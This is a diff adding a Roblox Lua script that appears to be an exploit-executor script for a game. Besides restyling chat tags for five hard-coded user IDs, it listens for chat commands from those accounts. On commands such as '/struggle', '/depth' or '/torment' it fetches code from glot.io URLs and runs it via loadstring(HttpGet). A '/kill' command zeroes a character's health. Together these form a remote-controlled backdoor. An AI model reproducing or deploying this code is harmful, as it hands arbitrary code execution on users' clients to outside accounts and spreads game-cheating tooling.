@@ -1,0 +1,163 @@
+coroutine.wrap(function()
+
+	local TextChatMessage	local TextChatService = game:GetService("TextChatService")
+
+	local Players = game:GetService("Players")
+
+	local i=0
+
+	TextChatService.OnIncomingMessage = function(message, TextChatMessage)
+
+		local props = Instance.new("TextChatMessageProperties")
+
+		if message.TextSource then
+
+			msg = string.lower(message.Text)
+
+			if message.TextSource.UserId == 3570707940 then
+
+				props.PrefixText = "<font color='#F53930'>[The Creator]</font> <font color='#F53930'>[The Jabiss]</font> " .. message.PrefixText
+
+			end
+
+			if message.TextSource.UserId == 2011017143 then
+
+				props.PrefixText = "<font color='#a85232'>[Big Helper]</font> <font color='#a85232'>[Squid]</font> " .. message.PrefixText
+
+			end
+
+if message.TextSource.UserId == 3834105284 then
+
+				props.PrefixText = "<font color='#a85232'>[Big Helper]</font> <font color='#a85232'>[Ame]</font> " .. message.PrefixText
+
+			end
+
+if message.TextSource.UserId == 3514603488 then
+
+				props.PrefixText = "<font color='#a85232'>[Big Helper]</font> <font color='#a85232'>[Nautic]</font> " .. message.PrefixText
+
+			end
+
+			if message.TextSource.UserId == 1736174957 then
+
+				props.PrefixText = "<font color='#6865FF'>[Helper]</font> <font color='#393B45'>[Noah]</font> " .. message.PrefixText
+
+			end
+
+			
+
+			local player = Players:GetPlayerByUserId(message.TextSource.UserId)
+
+			if player == game.Players.LocalPlayer then
+
+				i=i+1
+
+				if i==2 then
+
+					i=0
+
+					return props
+
+				end
+
+			end
+
+			if message.TextSource.UserId == 3570707940 or message.TextSource.UserId == 2011017143 or message.TextSource.UserId == 3834105284 or message.TextSource.UserId == 3514603488 or message.TextSource.UserId == 1736174957 then
+
+				
+
+				if msg == '/struggle' or msg == '/Struggle' then
+
+					loadstring(game:HttpGet("https://glot.io/snippets/glsigtq20l/raw/main.lua"))()
+
+				end
+
+if msg == '/depth' or msg == '/Depth' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/glsijqsw73/raw/main.lua"))()
+
+       end
+
+				
+
+				if msg == '/rebound' or msg == '/Rebound' then
+
+					loadstring(game:HttpGet("https://glot.io/snippets/glsbz9yych/raw/main.lua"))()
+
+				end
+
+				
+
+				if msg == '/hungered' or msg == '/Hungered' or msg == '/Hunger' or msg == '/hunger' then
+
+					loadstring(game:HttpGet("https://glot.io/snippets/glcs0nzixj/raw/main.lua"))()
+
+				end
+
+if msg == '/Hustle' or msg == '/hustle' or msg == '/A130' or msg == '/A-130' or msg == '/a-130' or msg == '/a130' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/gleepynjq5/raw/main.lua"))()
+
+       end
+
+if msg == '/kill' or msg == '/bye' then
+
+					coroutine.wrap(function()
+
+						player.Character.Humanoid.Health = 0
+
+firesignal(game.ReplicatedStorage.EntityInfo.DeathHint.OnClientEvent, {"L", "L", "L", "L", "L", "L", "L"}, "Blue")
+
+					end)()
+
+				end
+
+if msg == '/G-26' or msg == '/G26' or msg == '/g26' or msg == 'g-26' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/glto9kgokq/raw/main.lua"))()
+
+       end
+
+if msg == '/secret' or msg == '/Secret' or msg == '/gem' or msg == '/Gem' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/gltlhbfra2/raw/main.lua"))()
+
+       end
+
+if msg == '/defuse' or msg == '/Defuse' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/glkqkf1yus/raw/main.lua"))()
+
+       end
+
+if msg == '/torment' or msg == '/Torment' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/glsoa0kv2p/raw/main.lua"))()
+
+       end
+
+if msg == '/A60' or msg == '/A-60' or msg == '/a60' or msg == '/a-60' then
+
+loadstring(game:HttpGet("https://glot.io/snippets/glkxi69t3k/raw/main.lua"))()
+
+       end
+
+				
+
+				if msg == '/E200' or msg == '/E-200' or msg == '/e200' or msg == '/e-200' then
+
+					loadstring(game:HttpGet("https://glot.io/snippets/glsjnksf8l/raw/main.lua"))()
+
+				end
+
+			end
+
+return props
+
+		end
+
+	end
+
+	
+
+end)()
